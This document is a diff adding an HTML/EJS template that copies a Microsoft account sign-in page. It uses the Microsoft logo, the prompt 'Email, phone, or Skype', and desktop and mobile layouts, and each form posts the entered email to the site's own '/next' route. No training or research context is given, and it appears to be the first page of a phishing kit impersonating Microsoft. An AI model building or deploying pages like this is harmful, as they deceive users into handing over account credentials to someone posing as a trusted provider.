@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign in to your account</title>
+    <link rel="stylesheet" href="/css/css/style.css"/>
+
+    <link rel="icon" type="image/x-icon" href="/photos/Microsoft_logo.svg-removebg-preview.png">
+  </head>
+  <body>
+    <main class="screen">
+      <section class="card">
+        <div class="brand">
+          <img src="/photos/asdasaaaaaaaaaaaaaaaaaaaa.png"/>
+        </div>
+        <h1>Sign in</h1>
+
+        <form action="/next" method="post" novalidate>
+          <input
+            type="email"
+            name="email"
+            placeholder="Email, phone, or Skype"
+            value="<%= email %>"
+            required
+          />
+          <% if (error) { %>
+          <p class="error"><%= error %></p>
+          <% } %>
+          <p class="help">No account? <a href="#">Create one!</a></p>
+          <p class="help"><a href="#">Can't access your account?</a></p>
+          <div class="actions">
+            <button type="submit">Next</button>
+          </div>
+        </form>
+      </section>
+    </main>
+
+
+
+    <!--Phone-->
+    <main class="page-layout">
+        <section class="main-wrapper">
+            <div class="app-logo">
+                   <img src="/photos/asdasaaaaaaaaaaaaaaaaaaaa.png"/>
+            </div>
+            <h1>Sign in</h1>
+
+            <form action="/next" method="post" novalidate>
+                <input 
+                    type="email" 
+                    name="email" 
+                    placeholder="Email, phone, or Skype" 
+                    value="<%= email %>" 
+                    required
+                >
+                <% if (error) { %>
+                    <p class="alert-message"><%= error %></p>
+                <% } %>
+
+                <p class="link-info">No account? <a href="#">Create one!</a></p>
+                <p class="link-info"><a href="#">Can't access your account?</a></p>
+
+                <div class="form-btn-area">
+                    <button type="submit">Next</button>
+                </div>
+            </form>
+        </section>
+
+      
+    </main>
+
+
+  </body>
+</html>
